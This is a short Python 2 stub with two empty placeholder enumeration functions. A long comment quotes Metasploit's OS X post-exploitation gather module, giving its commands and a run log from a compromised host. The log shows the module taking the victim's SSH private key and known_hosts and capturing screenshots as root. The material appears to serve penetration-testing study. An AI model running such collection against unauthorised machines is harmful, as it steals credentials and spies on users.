def enum_users():
    return "users"

def enum_applications():
    print "applications"
        
# https://www.offensive-security.com/metasploit-unleashed/os-post-gather-modules/
# msf > use post/osx/gather/enum_osx
# msf  post(enum_osx) > run
# 
# [*] Running module against Victim.local
# [*] This session is running as root!
# [*] Saving all data to /root/.msf4/logs/post/enum_osx/Victim.local_20120926.3521
# [*]     Enumerating OS
# [*]     Enumerating Network
# [*]     Enumerating Bluetooth
# [*]     Enumerating Ethernet
# [*]     Enumerating Printers
# [*]     Enumerating USB
# [*]     Enumerating Airport
# [*]     Enumerating Firewall
# [*]     Enumerating Known Networks
# [*]     Enumerating Applications
# [*]     Enumerating Development Tools
# [*]     Enumerating Frameworks
# [*]     Enumerating Logs
# [*]     Enumerating Preference Panes
# [*]     Enumerating StartUp
# [*]     Enumerating TCP Connections
# [*]     Enumerating UDP Connections
# [*]     Enumerating Environment Variables
# [*]     Enumerating Last Boottime
# [*]     Enumerating Current Activity
# [*]     Enumerating Process List
# [*]     Enumerating Users
# [*]     Enumerating Groups
# [*] .ssh Folder is present for Victim
# [*]     Downloading id_dsa
# [*]     Downloading known_hosts
# [*] .gnupg Folder is present for Victim
# [*]     Downloading ls: /Users/Victim/.gnupg: No such file or directory
# [*] Capturing screenshot
# [*] Capturing screenshot for each loginwindow process since privilege is root
# [*]     Capturing for PID:2508
# ...snip...
# [*] Post module execution completed
